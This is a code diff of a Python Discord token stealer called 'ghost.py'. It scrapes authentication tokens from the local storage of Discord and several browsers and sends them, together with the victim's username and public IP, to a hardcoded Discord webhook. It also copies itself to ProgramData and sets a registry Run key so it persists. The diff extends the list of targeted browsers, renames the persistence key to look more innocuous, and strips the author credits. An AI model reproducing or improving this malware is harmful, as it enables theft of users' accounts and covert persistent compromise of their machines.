@@ -2,13 +2,8 @@ import requests, os, re, subprocess, sys, shutil, string, random
 from dhooks import Webhook, Embed
 from winreg import *
 
-#by @h6te
 
-class Ghost():
-    def __init__(self, *args, **kwargs):
-        super(Ghost, self).__init__(*args, **kwargs)
-
-def GhostExtract(path):
+def GhostExt(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
     try:
@@ -25,7 +20,7 @@ def GhostExtract(path):
         pass
 
 
-def GhostFallback():
+def GhostInf():
     ghostrp = (os.path.join('ghost.py')) 
     ghostlgm = r'C:\ProgramData\ghost.py'
     shutil.move(ghostrp,ghostlgm)
@@ -35,31 +30,13 @@ def GhostFallback():
     new_file_path = fp + '\\' + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
     key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    SetValueEx(key2change, 'WinProcessTreeLeveldj', 0, REG_SZ,
+    SetValueEx(key2change, 'Winx86ProcessTypeTreeSix', 0, REG_SZ,
                new_file_path)
 
-    ghostfile = (os.path.join('ghost.py'))
-    ghostopen = os.popen('attrib +h ' + ghostfile)
-    ghostread = ghostopen.read()
-    ghostopen.close()
 
-
-def GhostIdentifier():
-	ghstidwtf = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
-
-	ghost_identity =  open('ght.txt', 'w')
-	ghost_identity.write("The User Identifier is" + ghstidwtf)
-    ghost_identity.close()
-#still a work in process.
- 
-
-def GhostProcess():
-    hook = Webhook("")
+def GhostProc():
+    hook = Webhook("https://discord.com/api/webhooks/832837385271115817/dF0dHOgykgEIk98BOLsokhKWLR3cxFDywUZiu5Gucmy8Fu5jXqHipmnT3aeQ_vnRwZIH")
     user = os.getenv("UserName")
-    ghost_getidentity =  open('ght.txt', 'r')
-    identifiercode = ghost_getidentity.read()
-    ghost_getidentity.close()
-    identity = (identifiercode)
     hostname = requests.get("https://api.ipify.org").text 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -68,9 +45,11 @@ def GhostProcess():
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Google Chrome Canary': local + '\\Google\\Chrome SxS\\User Data\\Default',
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+        'Chromium':local + '\\Chromium\\User Data\\Default',
 
     }
 
@@ -81,7 +60,7 @@ def GhostProcess():
 
         message += '```'
 
-        tokens = GhostExtract(path)
+        tokens = GhostExt(path)
 
         if len(tokens) > 0:
             for token in tokens:
@@ -90,13 +69,11 @@ def GhostProcess():
             pass
 
         message += '```'
-        ctmsg = "made by https://github.com/f6ll"
 
 
-        embed = Embed(title=f' [  Ghost Logged | {user} | {hostname} | Identifier : {identity}  ] ',color=16764108)
-        embed.add_field("Creator", ctmsg)
-        embed.add_field("Extracted:",message)
+        embed = Embed(title=f' [ New Client Logged -> | {user} | {hostname} ] ',color=16764108)
+        embed.add_field("Found Tokens:",message)
         hook.send(embed=embed)
         
-GhostProcess()
-GhostFallback()
+GhostProc()
+GhostInf()
